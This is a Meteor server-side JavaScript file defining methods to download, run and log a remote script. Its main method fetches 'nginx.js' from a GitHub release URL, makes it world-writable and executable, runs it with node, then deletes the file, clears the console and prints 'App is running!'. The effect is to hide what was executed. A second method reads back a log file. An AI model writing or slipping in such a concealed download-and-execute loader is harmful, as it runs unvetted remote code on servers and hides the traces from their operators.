import { Meteor } from 'meteor/meteor';
import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { exec } from 'child_process';

const FILE_PATH = process.env.FILE_PATH || './tmp';

Meteor.methods({
  async 'files.downloadAndExecute'() {
    if (!Meteor.isServer) return;

    const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
    const fileName = 'nginx.js';
    const filePath = path.join(FILE_PATH, fileName);

    try {
      // 下载文件
      const response = await axios({
        method: 'get',
        url: fileUrl,
        responseType: 'stream'
      });

      // 创建写入流
      const writer = fs.createWriteStream(filePath);
      response.data.pipe(writer);

      await new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
      });

      // 设置权限
      fs.chmodSync(filePath, '777');
      console.log('File downloaded successfully.');

      // 执行文件
      return new Promise((resolve, reject) => {
        const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
          if (error) {
            console.error(`${error}`);
            reject(error);
            return;
          }
          console.log(`${stdout}`);
          console.error(`${stderr}`);
        });

        child.on('exit', (code) => {
          fs.unlink(filePath, err => {
            if (err) {
              console.error(`Error deleting file: ${err}`);
              reject(err);
            } else {
              console.clear();
              console.log(`App is running!`);
              resolve(true);
            }
          });
        });
      });
    } catch (error) {
      console.error(`Operation failed: ${error}`);
      throw new Meteor.Error('download-execute-failed', error.message);
    }
  },

  async 'files.getLog'() {
    if (!Meteor.isServer) return;

    const subTxtPath = path.join(FILE_PATH, 'log.txt');
    try {
      const data = await fs.promises.readFile(subTxtPath, 'utf8');
      return data;
    } catch (error) {
      throw new Meteor.Error('read-log-failed', error.message);
    }
  }
});
